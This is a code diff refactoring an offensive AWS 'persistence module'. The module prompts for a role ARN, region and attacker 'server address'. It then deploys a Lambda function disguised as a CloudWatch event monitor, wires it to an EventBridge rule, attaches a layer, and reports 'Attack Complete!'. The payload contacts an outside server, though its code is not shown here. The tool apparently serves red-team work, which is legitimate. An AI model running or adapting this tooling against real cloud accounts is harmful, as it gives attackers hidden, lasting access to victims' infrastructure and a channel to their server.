@@ -1,10 +1,9 @@
 import boto3
 import botocore
 import os
-import time
 import zipfile
 from colorama import Fore, Style
-from functions import create_client
+from functions import create_client, utils
 
 def help():
     print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")
@@ -21,20 +20,20 @@ def help():
     print("\tYou need the 'iam:passrole' and 'lambda:create_function' permissions.")
     print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")
 
-def aws_file():
-    with open("lambda_function.zip", 'rb') as file_data:
+def aws_file(lambda_path):
+    with open(lambda_path, 'rb') as file_data:
         bytes_content = file_data.read()
 
     return bytes_content
 
-def create_lambda(client, function_role):
+def create_lambda(client, function_role, lambda_path):
     response = client.create_function(
         FunctionName="EventMonitorFunction",
         Runtime="python3.9",
         Role=function_role,
         Handler="lambda_function.lambda_handler",
         Code={
-            "ZipFile": aws_file()
+            "ZipFile": aws_file(lambda_path)
         },
         Description="Lambda de monitoramento de Eventos do CloudWatch.",
         Publish=True,
@@ -68,8 +67,10 @@ def lambda_handler(event, context):
         print('[+] Zipping Lambda function...\n')
         with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
             zip_file.writestr('lambda_function.py', lambda_code)
+        return True
     except Exception as e:
         print('Failed to zip Lambda: {}\n'.format(e))
+        return False
 
 def assign_rule_target(client,function_name, function_arn):
     response = client.put_targets(
@@ -138,64 +139,72 @@ def main(botoconfig, session):
     results = {}
 
     print("[+] Starting persistence module...")
+    function_role, region_name, server_address = collect_inputs()
+    lambda_path = utils.create_temp_zip_path()
+    try:
+        print("[+] Creating Lambda file...")
+        if not create_lambda_file(server_address, lambda_path):
+            return utils.module_result(status="error", errors=["Failed to create lambda archive"])
+
+        print("[+] Creating EventBridge Rule...")
+        event_client = create_client.Client(botoconfig, session, "events", region_name)
+        rule_data = create_eventbrige_rule(event_client.create_aws_client())
+        print(f"[+] Rule created: {Fore.GREEN}{rule_data['RuleArn']}{Style.RESET_ALL}")
+        results['RuleArn'] = rule_data['RuleArn'] 
+
+        print("[+] Creating Lambda Function...")
+        lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
+        function_data = create_lambda(lambda_client.create_aws_client(), function_role, lambda_path)
+        print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
+        results['FunctionName'] = function_data['FunctionName']
+        results['FunctionArn'] = function_data['FunctionArn']
+        
+        print("[+] Assigning target to EventBridge rule...")
+        target = assign_rule_target(event_client.create_aws_client(), function_data['FunctionName'], function_data['FunctionArn'])
+        if target ['ResponseMetadata']['HTTPStatusCode'] == 200:
+            print(f"{Fore.GREEN}[+] Targed Successfully Assinged!{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[-] Failed to assign target...{Style.RESET_ALL}")
+
+        print("[+] Assigning trigger to Lambda function...")
+        trigger = assign_trigger(lambda_client.create_aws_client(), function_data['FunctionName'], rule_data['RuleArn'])
+        if trigger['ResponseMetadata']['HTTPStatusCode'] == 201:
+            print(f"{Fore.GREEN}[+] Trigger set!{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[-] Failed to set Trigger, attack failed...{Style.RESET_ALL}")
+
+        print("[+] Creating Lambda Layer...")
+        layer_client = boto3.client("lambda", config=botoconfig, region_name=region_name)
+        layer_information = create_lambda_layer(layer_client)
+        if layer_information['ResponseMetadata']['HTTPStatusCode'] == 201:
+            print(f"{Fore.GREEN}[+] Layer created!{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[-] Failed to create layer, attack failed...{Style.RESET_ALL}")
+
+        print("[+] Checking for lambda status...")
+        token = utils.poll_until(
+            lambda: check_lambda_status(layer_client, function_data['FunctionName']),
+            interval_seconds=10,
+            max_attempts=36
+        )
+        if not token:
+            return utils.module_result(status="error", errors=["Timed out waiting for Lambda to become active"])
+
+        print("[+] Assingning Layer to Function...")
+        update_layer = update_layer_information(layer_client, function_data['FunctionName'])
+        if update_layer['ResponseMetadata']['HTTPStatusCode'] == 200:
+            print(f"{Fore.GREEN}[+] Layer assigned! Attack Complete!{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[-] Failed to assign layer, attack failed...{Style.RESET_ALL}")
+
+        return utils.module_result(data=results)
+    finally:
+        if os.path.exists(lambda_path):
+            os.remove(lambda_path)
+
+
+def collect_inputs():
     function_role = input("[+] Please input the " + Fore.YELLOW + "role arn" + Style.RESET_ALL + " to be passed to the Lambda function: ")
     region_name = input("[+] Please input the " + Fore.YELLOW + "region" + Style.RESET_ALL + " to be used: ")
     server_address = input("[+] Please input the " + Fore.YELLOW + "server address" + Style.RESET_ALL + " to be used: ")
-    lambda_path = './lambda_function.zip'
-
-    print("[+] Creating Lambda file...")
-    create_lambda_file(server_address, lambda_path)
-
-    print("[+] Creating EventBridge Rule...")
-    event_client = create_client.Client(botoconfig, session, "events", region_name)
-    rule_data = create_eventbrige_rule(event_client.create_aws_client())
-    print(f"[+] Rule created: {Fore.GREEN}{rule_data['RuleArn']}{Style.RESET_ALL}")
-    results['RuleArn'] = rule_data['RuleArn'] 
-
-    print("[+] Creating Lambda Function...")
-    lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
-    function_data = create_lambda(lambda_client.create_aws_client(), function_role)
-    print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
-    results['FunctionName'] = function_data['FunctionName']
-    results['FunctionArn'] = function_data['FunctionArn']
-    
-    print("[+] Assigning target to EventBridge rule...")
-    target = assign_rule_target(event_client.create_aws_client(), function_data['FunctionName'], function_data['FunctionArn'])
-    if target ['ResponseMetadata']['HTTPStatusCode'] == 200:
-        print(f"{Fore.GREEN}[+] Targed Successfully Assinged!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}[-] Failed to assign target...{Style.RESET_ALL}")
-
-    print("[+] Assigning trigger to Lambda function...")
-    trigger = assign_trigger(lambda_client.create_aws_client(), function_data['FunctionName'], rule_data['RuleArn'])
-    if trigger['ResponseMetadata']['HTTPStatusCode'] == 201:
-        print(f"{Fore.GREEN}[+] Trigger set!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}[-] Failed to set Trigger, attack failed...{Style.RESET_ALL}")
-
-    print("[+] Creating Lambda Layer...")
-    layer_client = boto3.client("lambda", config=botoconfig, region_name=region_name)
-    layer_information = create_lambda_layer(layer_client)
-    if layer_information['ResponseMetadata']['HTTPStatusCode'] == 201:
-        print(f"{Fore.GREEN}[+] Layer created!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}[-] Failed to create layer, attack failed...{Style.RESET_ALL}")
-
-    print("[+] Checking for lambda status...")
-    while True:
-        token = check_lambda_status(layer_client, function_data['FunctionName'])
-        if token:
-            break
-        else:
-            time.sleep(10)
-
-    print("[+] Assingning Layer to Function...")
-    update_layer = update_layer_information(layer_client, function_data['FunctionName'])
-    if update_layer['ResponseMetadata']['HTTPStatusCode'] == 200:
-        print(f"{Fore.GREEN}[+] Layer assigned! Attack Complete!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}[-] Failed to assign layer, attack failed...{Style.RESET_ALL}")
-
-    os.remove(lambda_path)
-
-    return results
+    return function_role, region_name, server_address
